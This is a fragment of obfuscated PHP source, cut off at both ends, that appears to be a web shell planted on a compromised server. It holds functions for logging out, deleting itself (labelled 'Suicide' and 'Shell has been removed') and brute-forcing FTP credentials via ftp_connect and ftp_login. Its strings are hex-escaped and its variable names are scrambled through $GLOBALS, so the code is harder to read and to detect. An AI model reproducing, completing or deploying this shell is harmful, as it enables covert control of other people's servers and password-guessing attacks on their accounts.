nction actionLogout(){unset($_SESSION[md5($_SERVER["\x48T\x54P_\x48\x4f\x53\x54"])]);echo"\x62ye!";}function actionSelfRemove(){printHeader();if($_POST["\x701"]=="\x79\x65s"){if(@unlink(SELF_PATH))die("S\x68\x65l\x6c \x68as \x62\x65\x65\x6e r\x65mo\x76\x65\x64");else echo"unl\x69\x6e\x6b\x20\x65r\x72o\x72!";}echo"<\x681\x3e\x53\x75i\x63\x69de\x3c/\x681><d\x69\x76 c\x6c\x61\x73s=cont\x65\x6et>\x52\x65\x61lly\x20want\x20t\x6f\x20\x72\x65\x6dov\x65\x20the\x20s\x68\x65l\x6c?\x3c\x62\x72>\x3ca \x68ref\x3d\x23 \x6f\x6e\x63li\x63k\x3d\x22\x67(n\x75\x6cl,\x6eu\x6c\x6c,\x27yes\x27)\x22\x3e\x59\x65s</a></\x64\x69\x76>";printFooter();}function actionBruteforce(){printHeader();if(isset($_POST["pr\x6ft\x6f"])){$iootzroeuhu="\x73\x75c\x63\x65\x73\x73";echo"<\x681\x3e\x52e\x73u\x6c\x74\x73\x3c/h1><\x64\x69v\x20c\x6ca\x73\x73\x3d\x63\x6fn\x74ent><\x73\x70\x61n>\x54\x79pe:</\x73pa\x6e\x3e\x20".htmlspecialchars($_POST["\x70r\x6f\x74\x6f"])." <\x73\x70\x61\x6e>S\x65r\x76er:\x3c/span> ".htmlspecialchars($_POST["s\x65\x72v\x65r"])."<br\x3e";$bhkgkvaeqlw="\x61tt\x65\x6d\x70\x74\x73";if($_POST["\x70\x72o\x74o"]=="ftp"){function bruteForce($ip,$port,$login,$pass){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x63\x64\x6en\x65xt\x76h\x61\x69\x69"]="f\x70";$cuckmfmdmno="p\x6frt";$eqpfkdov="r\x65s";${"\x47\x4c\x4fB\x41L\x53"}["\x63\x75\x6f\x70\x6f\x64\x6c\x62\x6by\x6b"]="\x66\x70";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x79\x67\x75\x73\x6exlk\x61\x76\x71"]="ip";${${"\x47LO\x42AL\x53"}["\x63\x64nn\x65x\x74\x76\x68\x61\x69\x69"]}=@ftp_connect(${${"G\x4c\x4fB\x41\x4cS"}["y\x67\x75s\x6e\x78\x6c\x6b\x61\x76q"]},${${"GL\x4fB\x41\x4cS"}["tn\x6d\x62\x77b"]}?${$cuckmfmdmno}:21);${"\x47LOBA\x4c\x53"}["dh\x75\x65\x64\x75\x6d\x65\x72"]="\x70\x61\x73\x73";${"G\x4c\x4f\x42\x41\x4cS"}["\x6b\x66q\x76\x6b\x6e\x68p\x66\x65"]="\x6co\x67in";if(!${${"\x47\x4c\x4f\x42A\x4cS"}["\x63u\x6f\x70\x6f\x64l\x62\x6b\x79k"]})return false;${$eqpfkdov}=@ftp_login(${${"\x47L\x4fB\x41\x4c\x53"}["\x64tie\x64\x65\x64\x68"]},${${"\x47\x4c\x4f\x42\x